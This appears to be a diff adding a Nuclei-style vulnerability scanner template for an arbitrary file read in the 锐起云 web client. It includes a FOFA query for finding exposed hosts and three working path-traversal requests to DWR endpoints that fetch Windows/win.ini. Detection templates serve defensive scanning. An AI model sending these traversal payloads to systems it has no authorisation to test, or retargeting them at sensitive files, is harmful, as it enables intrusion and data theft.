@@ -1,0 +1,60 @@
+id: poc-yaml-richtech-dwr-anyfile-read
+info:
+  name: 锐起云 dwr 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in 锐起云 Web client by exploiting specific DWR endpoints.
+  metadata:
+    finger: 锐起云Web客户端
+    fofa: body="锐起云"
+
+http:
+  - raw:
+      - |
+        GET /login HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "<title>.*锐起云盘Web客户端.*</title>"
+
+  - raw:
+      - |
+        GET /dwr/hret/fileTree?filePath=../../../../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /dwr/srecy/xiazai?filePath=../../../../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /dwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
